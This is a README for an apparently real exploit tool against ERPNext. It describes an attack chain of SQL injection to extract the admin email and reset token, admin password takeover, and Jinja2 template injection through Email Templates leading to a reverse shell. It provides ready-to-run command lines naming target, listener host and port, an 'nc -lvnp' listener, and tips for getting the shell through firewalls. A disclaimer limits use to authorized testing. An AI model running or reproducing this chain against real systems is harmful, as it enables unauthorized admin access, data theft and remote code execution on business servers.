# ERPNext Vulnerability Exploitation Tool

This tool exploits multiple vulnerabilities in ERPNext systems to gain unauthorized access and remote code execution (RCE).

## Overview

The script targets vulnerable ERPNext instances by exploiting a series of vulnerabilities:

1. **SQL Injection**: Extracts administrator email through SQL injection vulnerability
2. **Password Reset**: Initiates and captures password reset tokens
3. **Authentication**: Resets administrator password and authenticates as admin
4. **Remote Code Execution**: Exploits Server-Side Template Injection (SSTI) to gain shell access

## Features

- SQL injection to extract sensitive information
- Password reset token extraction 
- Automated authentication
- Remote code execution via SSTI vulnerability
- Reverse shell generation
- Detailed error reporting and progress indicators

## Prerequisites

- Python 3.6+
- Required Python packages:
  - requests
  - argparse
  - re
  - json

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/erpnext-exploit.git
cd erpnext-exploit

# Install requirements
pip install requests
```

## Usage

### Basic Usage (Full Exploitation Chain)

```bash
python exploit.py --url http://target-erpnext:8000/ --lhost your-ip-address --lport 4444
```

### RCE-Only Mode

If you already have authentication or want to skip the initial exploitation steps:

```bash
python exploit.py --url http://target-erpnext:8000/ --lhost your-ip-address --lport 4444 --rce-only
```

### Authentication-Only Mode

To gain admin access without attempting RCE:

```bash
python exploit.py --url http://target-erpnext:8000/
```

### Setting Up a Listener

Before running the exploit with RCE, set up a listener to receive the reverse shell:

```bash
nc -lvnp 4444
```

## Command Line Arguments

- `--url`: Target ERPNext URL (required)
- `--lhost`: Listener IP address for reverse shell
- `--lport`: Listener port for reverse shell
- `--rce-only`: Skip authentication and only attempt RCE

## Technical Details

### Vulnerability Chain

1. **SQL Injection**: The tool exploits an SQL injection vulnerability in the web search functionality to extract the administrator's email address.

2. **Password Reset Capture**: It initiates a password reset for the administrator account and uses another SQL injection to extract the reset token.

3. **Authentication**: Using the extracted token, it resets the password and authenticates as the administrator.

4. **SSTI Exploitation**: Once authenticated, it exploits a Server-Side Template Injection vulnerability in the Email Template functionality to execute arbitrary code.

5. **Reverse Shell**: Finally, it creates a reverse shell connection back to the attacker's system.

### RCE Methodology

The RCE component exploits Jinja2 template injection to:
- Enumerate Python class hierarchy
- Identify the position of `subprocess.Popen` in the `__subclasses__` list
- Execute arbitrary shell commands via the `subprocess.Popen` class
- Establish a reverse shell connection

## Troubleshooting

### Common Issues

1. **Connection Issues**: 
   - Verify the target URL is accessible
   - Check for any firewalls blocking outbound connections

2. **Authentication Failures**: 
   - Ensure the target is actually vulnerable
   - Verify the SQL injection is working properly

3. **RCE Issues**:
   - Confirm the system has netcat installed
   - Check if outbound connections are allowed from the target
   - Try alternative reverse shell payloads

### Debugging

Add the `-v` or `--verbose` flag for more detailed output:

```bash
python exploit.py --url http://target:8000/ --lhost your-ip --lport 4444 --verbose
```

## Disclaimer

This tool is provided for educational and security research purposes only. Use only against systems you have permission to test. Unauthorized use is illegal and unethical.

## License

This project is licensed under the MIT License - see the LICENSE file for details.